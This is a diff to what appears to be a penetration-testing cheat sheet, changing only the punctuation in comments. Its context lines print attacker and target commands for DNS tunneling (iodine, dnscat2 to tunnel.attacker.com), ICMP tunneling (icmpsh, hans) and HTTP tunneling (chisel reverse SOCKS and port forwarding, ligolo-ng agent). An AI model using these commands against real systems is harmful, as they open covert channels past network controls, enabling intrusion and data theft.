@@ -31,16 +31,16 @@ done
 ## 2. DNS Tunneling
 
 ```bash
-# iodine — Server (attacker)
+# iodine - Server (attacker)
 iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
 
-# iodine — Client (target)
+# iodine - Client (target)
 iodine -f -P password tunnel.attacker.com
 
-# dnscat2 — Server
+# dnscat2 - Server
 ruby dnscat2.rb tunnel.attacker.com
 
-# dnscat2 — Client
+# dnscat2 - Client
 ./dnscat --dns domain=tunnel.attacker.com
 ```
 
@@ -49,14 +49,14 @@ ruby dnscat2.rb tunnel.attacker.com
 ## 3. ICMP Tunneling
 
 ```bash
-# icmpsh — Attacker
+# icmpsh - Attacker
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 python icmpsh_m.py attacker_ip target_ip
 
-# hans — Server
+# hans - Server
 hans -s 10.0.0.1 -p password
 
-# hans — Client
+# hans - Client
 hans -c server_ip -p password
 ```
 
@@ -65,19 +65,19 @@ hans -c server_ip -p password
 ## 4. HTTP/HTTPS Tunneling
 
 ```bash
-# chisel — Server (attacker)
+# chisel - Server (attacker)
 chisel server -p 8080 --reverse
 
-# chisel — Reverse SOCKS proxy
+# chisel - Reverse SOCKS proxy
 chisel client attacker:8080 R:1080:socks
 
-# chisel — Reverse port forward
+# chisel - Reverse port forward
 chisel client attacker:8080 R:9001:127.0.0.1:3306
 
-# ligolo-ng — Proxy (attacker)
+# ligolo-ng - Proxy (attacker)
 ligolo-proxy -selfcert -laddr 0.0.0.0:443
 
-# ligolo-ng — Agent (target)
+# ligolo-ng - Agent (target)
 ligolo-agent -connect attacker:443 -ignore-cert
 ```
 
